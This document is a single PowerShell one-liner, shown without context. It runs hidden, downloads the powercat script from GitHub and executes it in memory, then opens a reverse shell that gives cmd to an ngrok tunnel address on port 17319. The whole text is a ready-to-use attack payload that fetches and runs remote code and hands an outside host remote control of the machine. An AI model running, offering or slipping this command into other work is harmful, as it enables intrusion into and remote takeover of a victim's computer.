powershell -NoP -NonI -W hidden -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c tcp://0.tcp.eu.ngrok.io -p 17319 -e cmd"
